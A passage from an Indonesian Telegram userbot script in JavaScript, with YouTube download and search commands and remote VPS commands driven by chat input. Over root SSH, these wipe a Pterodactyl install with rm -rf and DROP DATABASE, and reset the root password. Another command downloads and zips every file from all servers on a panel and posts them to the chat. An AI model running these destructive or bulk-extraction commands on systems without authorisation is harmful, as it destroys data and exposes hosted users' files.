                    console.log(`❌ Stream download failed: ${streamError.message}`);
                    throw new Error('ɢᴀɢᴀʟ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ');
                }
            }

            if (!videoBuffer || videoBuffer.length === 0) {
                throw new Error('ғɪʟᴇ ᴠɪᴅᴇᴏ ᴋᴏsᴏɴɢ');
            }

            const fileSizeMB = (videoBuffer.length / (1024 * 1024)).toFixed(1);
            
            const maxSize = 50 * 1024 * 1024;
            if (videoBuffer.length > maxSize) {
                await client.editMessage(msg.chatId, {
                    message: progressMsg.id,
                    text: `<blockquote>📁 ғɪʟᴇ ᴛᴇʀʟᴀʟᴜ ʙᴇsᴀʀ (${fileSizeMB}MB)\n\n🔗 <a href="${downloadUrl}">ᴋʟɪᴋ ᴅɪsɪɴɪ ᴜɴᴛᴜᴋ ᴅᴏᴡɴʟᴏᴀᴅ</a>\n\n🎬 <b>${video.title}</b>\n⏱️ ${video.duration.timestamp || 'Unknown'}</blockquote>`,
                    parseMode: "html"
                });
                await client.deleteMessages(msg.chatId, [progressMsg.id], { revoke: true });
                return;
            }

            const tempFile = `./temp_${Date.now()}.mp4`;
            fs.writeFileSync(tempFile, videoBuffer);

            let thumbBuffer = null;
            const thumbUrl = video.thumbnail;
            if (thumbUrl) {
                try {
                    const thumbResponse = await fetch(thumbUrl, { timeout: 15000 });
                    if (thumbResponse.ok) {
                        const thumbArrayBuffer = await thumbResponse.arrayBuffer();
                        thumbBuffer = Buffer.from(thumbArrayBuffer);
                    }
                } catch (thumbError) {
                    console.log('Gagal download thumbnail:', thumbError.message);
                }
            }

            await client.editMessage(msg.chatId, {
                message: progressMsg.id,
                text: `<blockquote>🚀 ᴍᴇɴɢɪʀɪᴍ ᴠɪᴅᴇᴏ...\n\n⏳ ᴍᴏʜᴏɴ ᴛᴜɴɢɢᴜ, ᴠɪᴅᴇᴏ sᴇᴅᴀɴɢ ᴅɪᴋɪʀɪᴍ...</blockquote>`,
                parseMode: "html"
            });

            const duration = video.duration.timestamp || 'Unknown';
            const views = video.views?.toLocaleString() || 'Unknown';
            const author = video.author?.name || 'Unknown';
            const title = video.title;

            try {
                await client.sendMessage(msg.chatId, {
                    file: tempFile,
                    thumb: thumbBuffer,
                    message: `<blockquote>➤ ᴊᴜᴅᴜʟ: \n<b>${title}</b>\n\n➤ ᴅᴜʀᴀsɪ: ${duration}\n➤ ᴠɪᴇᴡs: ${views}\n➤ ᴄʜᴀɴɴᴇʟ: ${author}\n➤ sɪᴢᴇ: ${fileSizeMB}MB\n\n➤ <a href="${youtubeUrl}">ᴛᴏɴᴛᴏɴ ᴅɪ ʏᴏᴜᴛᴜʙᴇ</a>\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (sendError) {
                console.log(`Send error: ${sendError.message}`);
                try {
                    await client.sendMessage(msg.chatId, {
                        file: tempFile,
                        message: `<blockquote>➤ ᴊᴜᴅᴜʟ: \n<b>${title}</b>\n\n➤ ᴅᴜʀᴀsɪ: ${duration}\n➤ ᴠɪᴇᴡs: ${views}\n➤ ᴄʜᴀɴɴᴇʟ: ${author}\n➤ sɪᴢᴇ: ${fileSizeMB}MB\n\n➤ <a href="${youtubeUrl}">ᴛᴏɴᴛᴏɴ ᴅɪ ʏᴏᴜᴛᴜʙᴇ</a>\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                } catch (sendError2) {
                    await client.editMessage(msg.chatId, {
                        message: progressMsg.id,
                        text: `<blockquote>⚠️ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇɴɢɪʀɪᴍ ᴠɪᴅᴇᴏ\n\n🔗 <a href="${downloadUrl}">ᴋʟɪᴋ ᴜɴᴛᴜᴋ ᴅᴏᴡɴʟᴏᴀᴅ</a>\n\n🎬 <b>${title}</b>\n⏱️ ${duration}</blockquote>`,
                        parseMode: "html"
                    });
                }
            }

            try {
                fs.unlinkSync(tempFile);
            } catch (cleanError) {
                console.log('Cleanup error:', cleanError.message);
            }
            
            try {
                await client.deleteMessages(msg.chatId, [progressMsg.id], { revoke: true });
            } catch (deleteError) {
                console.log('Delete error:', deleteError.message);
            }

        } catch (error) {
            await client.editMessage(msg.chatId, {
                message: progressMsg.id,
                text: `<blockquote>❌ ${error.message}</blockquote>`,
                parseMode: "html"
            });
        }

    } catch (error) {
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ ᴇʀʀᴏʀ: ${error.message}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id,
        });
    }
    return;
}
       
       // .yts
      if (msg.text?.startsWith(`${prefix}yts`)) {
  (async () => {
    const chatId = msg.chatId;
    const text = msg.text?.split(" ").slice(1).join(" ");
    
    if (!text) {
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ <b>ᴍᴀsᴜᴋᴋᴀɴ ᴋᴀᴛᴀ ᴋᴜɴᴄɪ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇᴏ ʏᴏᴜᴛᴜʙᴇ!</b></blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });
      return;
    }

    try {
      const loadingMsg = await client.sendMessage(msg.chatId, {
        message: `<blockquote>🔍 <i>ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇᴏ ʏᴏᴜᴛᴜʙᴇ ᴜɴᴛᴜᴋ:</i> <b>${text}</b> ...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const yts = require("yt-search");
      const results = await yts(text);
      
      if (!results.videos || results.videos.length === 0) {
        await client.deleteMessages(msg.chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
        await client.sendMessage(msg.chatId, {
          message: `<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴠɪᴅᴇᴏ ᴜɴᴛᴜᴋ:</b> ${text}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }
      
      await client.deleteMessages(msg.chatId, [loadingMsg.id], { revoke: true }).catch(() => {});

      const video = results.videos[0];
      const caption = `
<blockquote>
🎬 <b>${video.title}</b><br>
👤 <b>ᴄʜᴀɴɴᴇʟ:</b> ${video.author.name}<br>
⏱️ <b>ᴅᴜʀᴀsɪ:</b> ${video.timestamp}<br>
👀 <b>ᴠɪᴇᴡs:</b> ${video.views.toLocaleString()}<br>
📅 <b>ᴜᴘʟᴏᴀᴅ:</b> ${video.ago}<br><br>
🔗 <a href="${video.url}">🎬 Klik untuk tonton di YouTube</a>\n© ʙʏ ᴅᴏʏᴀɴɢ 👑
</blockquote>
`;

      try {
        await client.sendFile(msg.chatId, {
          file: video.image,
          caption,
          parseMode: "html",
          replyTo: msg.id,
        });
      } catch (err) {
        console.error("Gagal kirim thumbnail:", err.message);
        await client.sendMessage(msg.chatId, {
          message: `${caption}\n🔗 ${video.url}`,
          parseMode: "html",
          replyTo: msg.id,
        });
      }

    } catch (err) {
      console.error("❌ YTS Error:", err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇᴏ ʏᴏᴜᴛᴜʙᴇ!</b></blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });
    }
  })();
  return;
}

       // uninstallpanel
       if (msg.text?.startsWith(`${prefix}uninstallpanel`)) {
  (async () => {
    const { Client } = require("ssh2");
    
    try {
      const chatId = msg.chatId;
      const args = msg.text.split(" ").slice(1).join(" ");
      const t = args.split(",").map(x => x.trim());

      if (t.length < 2) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}uninstallpanel ip_vps,password_vps\n\n<b>Contoh:</b> .uninstallpanel 1.2.3.4,PasswordVps</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const [ipvps, passwd] = t;

      const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
      if (!ipRegex.test(ipvps)) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ Format IP tidak valid!</blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const conn = new Client();

      const connSettings = {
        host: ipvps,
        port: 22,
        username: "root",
        password: passwd,
      };

      const uninstallCommand = `echo "🚀 Sedang menghapus Pterodactyl dan Wings..."
systemctl stop wings || true
systemctl disable wings || true
systemctl stop nginx mariadb redis || true
systemctl disable nginx mariadb redis || true
rm -rf /var/www/pterodactyl /etc/pterodactyl /var/lib/pterodactyl /etc/systemd/system/wings.service /usr/local/bin/wings /root/pterodactyl-installer.sh
mysql -u root -e "DROP DATABASE IF EXISTS panel;" 2>/dev/null || true
apt remove -y nginx mariadb-server redis-server php* 2>/dev/null || true
apt autoremove -y 2>/dev/null || true
apt clean 2>/dev/null || true
echo "✅ Uninstall Pterodactyl & Wings berhasil dihapus sepenuhnya."`;

      await client.sendMessage(chatId, {
        message: `<blockquote>🚀 <b>ᴘʀᴏɢʀᴇss ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ᴅɪᴍᴜʟᴀɪ...</b>\n\n🖥️ <b>ɪᴘ</b> : <code>${ipvps}</code>\n\n⏳ ᴍᴏʜᴏɴ ᴛᴜɴɢɢᴜ ʙᴇʙᴇʀᴀᴘᴀ ᴍᴇɴɪᴛ...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      conn.on("ready", () => {
        client.sendMessage(chatId, {
          message: "<blockquote>✅ <b>ʙᴇʀʜᴀsɪʟ ᴛᴇʀʜᴜʙᴜɴɢ ᴋᴇ VPS</b>\n🚀 <b>ᴍᴜʟᴀɪ ᴘʀᴏsᴇs ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ...</b></blockquote>",
          parseMode: "html"
        });

        conn.exec(uninstallCommand, { pty: true }, (err, stream) => {
          if (err) {
            client.sendMessage(chatId, {
              message: "<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ</blockquote>",
              parseMode: "html"
            });
            conn.end();
            return;
          }

          let output = "";

          stream.on("data", (data) => {
            output += data.toString();
            console.log("[UNINSTALL LOG]", data.toString());
          });

          stream.stderr.on("data", (data) => {
            console.error("[UNINSTALL ERR]", data.toString());
          });

          stream.on("close", (code) => {
            conn.end();
            if (code === 0) {
              client.sendMessage(chatId, {
                message: `<blockquote>✅ <b>ʙᴇʀʜᴀsɪʟ ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ!</b>\n\nᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ & ᴡɪɴɢs ᴛᴇʟᴀʜ ᴅɪʜᴀᴘᴜs sᴇᴘᴇɴᴜʜɴʏᴀ ᴅᴀʀɪ VPS\n\n🖥️ <b>ɪᴘ:</b> <code>${ipvps}</code>\n\n✅ <b>sᴛᴀᴛᴜs:</b> ᴜɴɪɴsᴛᴀʟʟ sᴜᴋsᴇs</blockquote>`,
                parseMode: "html"
              });
            } else {
              client.sendMessage(chatId, {
                message: `<blockquote>⚠️ ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ sᴇʟᴇsᴀɪ ᴅᴇɴɢᴀɴ ᴋᴏᴅᴇ: <b>${code}</b>\n\nᴍᴏʜᴏɴ ᴘᴇʀɪᴋsᴀ ᴍᴀɴᴜᴀʟ ᴀᴘᴀᴋᴀʜ ᴛᴇʀᴅᴀᴘᴀᴛ ғɪʟᴇ sɪsᴀ</blockquote>`,
                parseMode: "html"
              });
            }
          });
        });
      });

      conn.on("error", (err) => {
        if (err.message.includes("All configured authentication methods failed")) {
          client.sendMessage(chatId, { 
            message: "<blockquote>❌ ᴘᴀssᴡᴏʀᴅ VPS sᴀʟᴀʜ ᴀᴛᴀᴜ ᴀᴋsᴇs SSH ᴅɪᴛᴏʟᴀᴋ</blockquote>", 
            parseMode: "html" 
          });
        } else if (err.message.includes("ECONNREFUSED")) {
          client.sendMessage(chatId, { 
            message: "<blockquote>❌ ᴘᴏʀᴛ 22 VPS ᴛɪᴅᴀᴋ ᴛᴇʀʙᴜᴋᴀ ᴀᴛᴀᴜ VPS ᴍᴀᴛɪ</blockquote>", 
            parseMode: "html" 
          });
        } else if (err.message.includes("ETIMEDOUT")) {
          client.sendMessage(chatId, { 
            message: "<blockquote>❌ VPS ᴛɪᴅᴀᴋ ᴍᴇʀᴇsᴘᴏɴ ᴀᴛᴀᴜ ᴛɪᴍᴇᴏᴜᴛ</blockquote>", 
            parseMode: "html" 
          });
        } else {
          client.sendMessage(chatId, { 
            message: `<blockquote>❌ SSH ᴇʀʀᴏʀ: ${err.message}</blockquote>`, 
            parseMode: "html" 
          });
        }
      });

      conn.connect(connSettings);

    } catch (e) {
      console.error("Error uninstallpanel:", e);
      await client.sendMessage(chatId, { 
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ: ${e.message}</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
      });
    }
  })();
  return;
}

       // Ambilfile
       if (msg.text?.startsWith(`${prefix}ambilfile`)) {
  (async () => {
    const AdmZip = require('adm-zip');
    const path = require('path');
    const fs = require('fs');
    
    const { domain, plta, pltc } = require("./config/pterodactyl.js");

    async function downloadFileFromServer(uuid, filePath) {
      try {
        const res = await fetch(`${domain}/api/client/servers/${uuid}/files/download?file=${encodeURIComponent(filePath)}`, {
          headers: { Authorization: `Bearer ${pltc}` },
        });

        if (!res.ok) throw new Error(`Gagal ambil signed_url ${filePath}`);
        const data = await res.json();
        const signedUrl = data?.attributes?.url;
        if (!signedUrl) throw new Error(`Signed URL tidak ditemukan untuk ${filePath}`);

        const fileRes = await fetch(signedUrl);
        if (!fileRes.ok) throw new Error(`Gagal download file ${filePath}`);
        const buffer = await fileRes.arrayBuffer();
        return Buffer.from(buffer);
      } catch (error) {
        console.error(`Download error for ${filePath}:`, error.message);
        throw error;
      }
    }

    async function getServerFiles(uuid, folder = "/") {
      try {
        const res = await fetch(`${domain}/api/client/servers/${uuid}/files/list?directory=${encodeURIComponent(folder)}`, {
          headers: { Authorization: `Bearer ${pltc}` },
        });
        if (!res.ok) throw new Error("Gagal ambil daftar file");

        const data = await res.json();
        if (!data?.data) return [];

        return data.data.filter(f => 
          f.attributes?.is_file && 
          !f.attributes?.name.startsWith("/") && 
          !f.attributes?.name.includes("home") && 
          !f.attributes?.name.includes("container")
        );
      } catch (error) {
        console.error(`Get files error for ${uuid}:`, error.message);
        return [];
      }
    }

    try {
      const chatId = msg.chatId;
      
      // Kirim pesan loading
      const loadingMsg = await client.sendMessage(chatId, { 
        message: "<blockquote>⏳ Mendownload semua file dari semua server Pterodactyl...</blockquote>", 
        parseMode: "html", 
        replyTo: msg.id 
      });

      const res = await fetch(`${domain}/api/application/servers`, {
        headers: { Authorization: `Bearer ${plta}` },
      });
      
      if (!res.ok) {
        throw new Error(`API Error: ${res.status} ${res.statusText}`);
      }
      
      const srvData = await res.json();
      const servers = srvData?.data || [];

      if (!servers.length) {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, { 
          message: "<blockquote>⚠️ Tidak ada server yang ditemukan di panel Pterodactyl</blockquote>", 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      let successCount = 0;
      let totalFiles = 0;

      for (const srv of servers) {
        const uuid = srv.attributes.uuid;
        const serverName = srv.attributes.name || `server_${srv.attributes.id}`;
        const serverId = srv.attributes.identifier || srv.attributes.id;
        
        await client.editMessage(chatId, {
          message: loadingMsg.id,
          text: `<blockquote>⏳ Memproses server: <b>${serverName}</b>\n🔄 Mengambil daftar file...</blockquote>`,
          parseMode: "html"
        }).catch(() => {});

        const zip = new AdmZip();
        const files = await getServerFiles(uuid, "/");
        
        if (files.length === 0) {
          await client.sendMessage(chatId, { 
            message: `<blockquote>⚠️ Server <b>${serverName}</b> (${serverId}) tidak memiliki file yang bisa diambil</blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
          });
          continue;
        }

        let downloadedFiles = 0;
        
        for (const file of files) {
          try {
            await client.editMessage(chatId, {
              message: loadingMsg.id,
              text: `<blockquote>🚀 Mendownload file dari <b>${serverName}</b>\n📄 File: <code>${file.attributes.name}</code>\n✅ Download: ${downloadedFiles}/${files.length}</blockquote>`,
              parseMode: "html"
            }).catch(() => {});

            const buffer = await downloadFileFromServer(uuid, file.attributes.name);
            zip.addFile(file.attributes.name, buffer);
            downloadedFiles++;
            totalFiles++;
            
            await new Promise(resolve => setTimeout(resolve, 100));
            
          } catch (err) {
            console.warn(`⚠️ Gagal download ${file.attributes.name} dari ${serverName}: ${err.message}`);
          }
        }

        if (zip.getEntries().length > 0) {
          const zipFileName = `${serverName.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.zip`;
          const zipPath = path.join(__dirname, zipFileName);
          
          try {
            zip.writeZip(zipPath);
            successCount++;
            
            await client.sendFile(chatId, {
              file: zipPath,
              caption: `<blockquote>✅ File server <b>${serverName}</b>\n📦 Total file: ${zip.getEntries().length}\n🆔️ Server ID: ${serverId}\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
              parseMode: "html",
              replyTo: msg.id
            });
            
            try {
              fs.unlinkSync(zipPath);
            } catch (unlinkErr) {
              console.warn("Gagal hapus file sementara:", unlinkErr.message);
            }
            
          } catch (zipErr) {
            console.error(`Error creating ZIP for ${serverName}:`, zipErr.message);
            await client.sendMessage(chatId, { 
              message: `<blockquote>❌ Gagal membuat ZIP untuk server <b>${serverName}</b></blockquote>`, 
              parseMode: "html", 
              replyTo: msg.id 
            });
          }
        }
      }

      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});

      await client.sendMessage(chatId, { 
        message: `<blockquote>✏️ <b>Download Selesai</b>\n\n✅ Server berhasil: ${successCount}/${servers.length}\n📋 Total file: ${totalFiles}</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
      });

    } catch (err) {
      console.error("Error in .ambilsemua command:", err);
      
      try {
        if (loadingMsg?.id) {
          await client.deleteMessages(msg.chatId, [loadingMsg.id], { revoke: true });
        }
      } catch {}
      
      await client.sendMessage(msg.chatId, { 
        message: `<blockquote>❌ Terjadi kesalahan:\n<code>${err.message}</code>\n\nPastikan API Pterodactyl aktif dan konfigurasi benar.</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
      });
    }
  })();
  return;
}

       // === NEW VPS COMMANDS ===
      if (msg.text?.startsWith(`${prefix}pass`)) {
  (async () => {
    const SSH2 = require('ssh2');
    
    function escapeHtml(s = "") {
      return s.replace(/&/g, "&amp;")
              .replace(/</g, "&lt;")
              .replace(/>/g, "&gt;")
              .replace(/"/g, "&quot;");
    }

    try {
      const chatId = msg.chatId;
      const parts = msg.text.trim().split(/\s+/);
      
      if (parts.length < 4) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ Format: <b>${prefix}pass &lt;ip_vps&gt; &lt;pass_old&gt; &lt;pass_new&gt;</b>\n\nContoh: <code>.pass 192.168.1.1 password123 newpassword456</code></blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const ip = parts[1];
      const passOld = parts[2];
      const passNew = parts[3];
      const port = 22;
      const targetUser = "root";

      const ipRegex = /^(?:\d{1,3}\.){3}\d{1,3}$/;
      if (!ipRegex.test(ip)) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ Format IP tidak valid!\n\nContoh IP: <code>192.168.1.1</code></blockquote>",
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const statusMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 Mencoba terhubung ke <code>${ip}</code>...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const conn = new SSH2.Client();
      let finished = false;
      
      const connectTimeout = setTimeout(() => {
        if (!finished) {
          finished = true;
          try { conn.end(); } catch(_) {}
          client.sendMessage(chatId, { 
            message: `<blockquote>❌ Timeout: gagal terhubung ke ${ip} (25 detik)</blockquote>`, 
            parseMode: "html",
            replyTo: msg.id 
          }).catch(()=>{});
        }
      }, 25000); 
      
      conn.on("ready", () => {
        (async () => {
          try {
            await client.editMessage(chatId, {
              message: statusMsg.id,
              text: `<blockquote>✅ Terhubung ke ${ip}\n🔄 Mencoba mengganti password...</blockquote>`,
              parseMode: "html"
            }).catch(()=>{});
            
            const safeNew = passNew.replace(/["`\\\$]/g, "\\$&");
            const cmd = `echo "${targetUser}:${safeNew}" | chpasswd`;

            conn.exec(cmd, { pty: true }, (err, stream) => {
              if (err) {
                clearTimeout(connectTimeout);
                finished = true;
                conn.end();
                client.sendMessage(chatId, { 
                  message: `<blockquote>❌ Gagal menjalankan perintah: ${err.message}</blockquote>`, 
                  parseMode: "html",
                  replyTo: msg.id 
                }).catch(()=>{});
                return;
              }

              let stdout = "";
              let stderr = "";
              stream.on("close", (code, signal) => {
                clearTimeout(connectTimeout);
                finished = true;
                conn.end();
                
                client.deleteMessages(chatId, [statusMsg.id], { revoke: true }).catch(() => {});
                
                if (code === 0) {
                  client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>Password berhasil diubah!</b>\n\n👤 <b>Username:</b> ${targetUser}\n🌐 <b>IP:</b> <code>${ip}</code>\n🔑 <b>Password Baru:</b> <code>${passNew}</code>\n\n⚠️ <i>Simpan password baru dengan aman!</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id,
                  }).catch(()=>{});
                } else {
                  const errTxt = stderr || `Exit code ${code} (signal ${signal})`;
                  client.sendMessage(chatId, {
                    message: `<blockquote>❌ Gagal mengubah password.\n\nError: <code>${escapeHtml(errTxt)}</code></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id,
                  }).catch(()=>{});
                }
              }).on("data", (data) => {
                stdout += data.toString();
              }).stderr.on("data", (data) => {
                stderr += data.toString();
              });
            });

          } catch (e) {
            clearTimeout(connectTimeout);
            finished = true;
            conn.end();
            await client.sendMessage(chatId, { 
              message: `<blockquote>❌ Error saat mencoba mengganti password: ${e.message || e}</blockquote>`, 
              parseMode: "html",
              replyTo: msg.id 
            }).catch(()=>{});
          }
        })();
      });

      conn.on("error", async (err) => {
        if (finished) return;
        finished = true;
        clearTimeout(connectTimeout);

        let userMsg = `<blockquote>❌ Gagal terhubung ke ${ip}: ${err.message || err}</blockquote>`;
        
        if (err.level === "client-authentication" || /All configured authentication methods failed/.test(String(err.message))) {
          userMsg = "<blockquote>❌ Autentikasi gagal — password lama salah.</blockquote>";
        } else if (err.code === "ECONNREFUSED" || /connect ECONNREFUSED/.test(String(err.message))) {
          userMsg = "<blockquote>❌ Koneksi ditolak — IP/port mungkin tidak benar atau SSH tidak aktif di server.</blockquote>";
        } else if (err.code === "ENOTFOUND" || /getaddrinfo ENOTFOUND/.test(String(err.message))) {
          userMsg = "<blockquote>❌ IP/domain tidak ditemukan — periksa IP atau DNS.</blockquote>";
        } else if (/timed out|ETIMEDOUT/.test(String(err.message))) {
          userMsg = "<blockquote>❌ Timeout saat mencoba menyambung — server mungkin tidak dapat dijangkau.</blockquote>";
        }

        try { 
          await client.sendMessage(chatId, { 
            message: userMsg, 
            parseMode: "html",
            replyTo: msg.id 
          }); 
        } catch(_) {}
        
        try { conn.end(); } catch(_) {}
        
        await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }).catch(() => {});
      });

      conn.on("end", () => {
      });

      conn.on("close", (hadError) => {
      });

      conn.connect({
        host: ip,
        port,
        username: targetUser,
        password: passOld,
        readyTimeout: 20000,
      });

    } catch (err) {
      console.error("Error in .pass command:", err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Error: ${err.message || err}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(()=>{});
    }
  })();
  return;
}
      
      // .cekvps
      if (msg.text?.startsWith(`${prefix}cekvps`)) {
  (async () => {
    const Client = require('ssh2').Client;
    
    try {
      const chatId = msg.chatId;
      const args = msg.text.split(" ").slice(1);
      
      if (args.length < 2) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ Format: <b>${prefix}cekvps ip password</b>\n\nContoh: <code>.cekvps 192.168.1.1 password123</code></blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const ip = args[0];
      const password = args[1];

      const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
      if (!ipRegex.test(ip)) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ Format IP tidak valid!\n\nContoh IP: <code>192.168.1.1</code></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🔍 Mengecek VPS ${ip}...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      function executeSSHCommand(conn, command) {
        return new Promise((resolve, reject) => {
          conn.exec(command, (err, stream) => {
            if (err) {
              reject(err);
              return;
            }
            
            let data = '';
            stream.on('data', (chunk) => {
              data += chunk.toString();
            });
            
            stream.on('close', (code) => {
              if (code === 0) {
                resolve(data.trim());
              } else {
                reject(new Error(`Command failed with code ${code}`));
              }
            });
            
            stream.stderr.on('data', (errData) => {
              reject(new Error(errData.toString()));
            });
          });
        });
      }

      const conn = new Client();
      
      conn.on('ready', async () => {
        try {
          const commands = {
            ram: "free -h | grep Mem | awk '{print $2}'",
            used_ram: "free -h | grep Mem | awk '{print $3}'",
            swap: "free -h | grep Swap | awk '{print $2}'",
            cores: "nproc",
            runtime: "uptime -p",
            distro: "cat /etc/os-release | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '\"'",
            hostname: "hostname",
            disk: "df -h / | awk 'NR==2 {print $2}'",
            used_disk: "df -h / | awk 'NR==2 {print $3}'",
            cpu_model: "lscpu | grep 'Model name' | cut -d':' -f2 | xargs"
          };

          const results = {};
          
          for (const [key, command] of Object.entries(commands)) {
            try {
              results[key] = await executeSSHCommand(conn, command);
            } catch (error) {
              results[key] = "N/A";
            }
          }

          const messageText = `<blockquote>🖥️ <b>STATUS STATUS - ${ip}</b>\n\n➤ <b>Distro:</b> ${results.distro || 'N/A'}\n➤ <b>Hostname:</b> ${results.hostname || 'N/A'}\n➤ <b>RAM:</b> ${results.used_ram || 'N/A'} / ${results.ram || 'N/A'}\n➤ <b>Disk:</b> ${results.used_disk || 'N/A'} / ${results.disk || 'N/A'}\n➤ <b>CPU:</b> ${results.cpu_model?.substring(0, 30) || 'N/A'}\n➤ <b>Cores:</b> ${results.cores || 'N/A'}\n➤ <b>Uptime:</b> ${results.runtime ? results.runtime.replace('up ', '') : 'N/A'}\n\n➤ <b>Status:</b> ✅ <b>Connected</b></blockquote>`;

          await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(()=>{});
          
          await client.sendMessage(chatId, {
            message: messageText,
            parseMode: "html",
            replyTo: msg.id
          });

        } catch (error) {
          await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(()=>{});
          
          await client.sendMessage(chatId, {
            message: `<blockquote>❌ Error saat mengambil data: ${error.message}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
          });
        } finally {
          conn.end();
        }
      });

      conn.on('error', async (err) => {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(()=>{});
        
        let errorMessage = "❌ Gagal terhubung ke VPS";
        
        if (err.message?.includes('ECONNREFUSED')) {
          errorMessage = "❌ Koneksi ditolak - pastikan SSH aktif di VPS (port 22)";
        } else if (err.message?.includes('ETIMEDOUT')) {
          errorMessage = "❌ Timeout: VPS tidak merespons";
        } else if (err.message?.includes('ENOTFOUND')) {
          errorMessage = "❌ Host tidak ditemukan";
        } else if (err.message?.includes('Authentication failed')) {
          errorMessage = "❌ Password salah atau akses ditolak";
        } else if (err.message?.includes('All configured authentication methods failed')) {
          errorMessage = "❌ Authentication gagal - cek username/password";
        }
        
        await client.sendMessage(chatId, {
          message: `<blockquote>${errorMessage}\n\nError: <code>${err.message}</code></blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
      });

      conn.on('timeout', async () => {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(()=>{});
        
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ Timeout: Koneksi terlalu lama (15 detik)</blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
      });

      conn.connect({
        host: ip,
        port: 22,
        username: 'root',
        password: password,
        readyTimeout: 15000,
        tryKeyboard: true
      });

    } catch (error) {
      console.error("cekvps error:", error);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

// .reqpair
if (msg.text?.startsWith(`${prefix}reqpair`)) {
  (async () => {
    try {
      const chatId = msg.chatId || msg.chat.id;
      const args = msg.text.split(" ").slice(1);

      if (args.length < 1) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}reqpair 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

